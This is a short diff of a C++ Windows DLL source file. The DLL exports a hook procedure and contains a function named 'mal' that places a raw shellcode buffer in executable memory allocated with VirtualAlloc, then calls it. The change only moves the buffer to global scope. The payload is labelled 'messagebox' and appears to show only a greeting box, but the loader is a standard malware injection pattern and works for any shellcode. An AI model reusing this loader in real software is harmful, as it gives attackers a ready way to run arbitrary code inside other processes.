@@ -2,7 +2,7 @@
 #include <windows.h>
 #include "mingw.thread.h"
 extern "C" __declspec(dllexport) int NextHook(int code, WPARAM wParam, LPARAM lParam) { return CallNextHookEx(NULL, code, wParam, lParam); }
-void mal() {
+
     unsigned char buf[] = // messagebox
     "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
     "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
@@ -28,6 +28,8 @@ void mal() {
     "\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d\x20\x75"
     "\x72\x6d\x6f\x6d\x00\x4d\x65\x73\x73\x61\x67\x65\x42\x6f"
     "\x78\x00";
+
+void mal() {
     void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, buf, sizeof buf);
     ((void(*)())exec)();
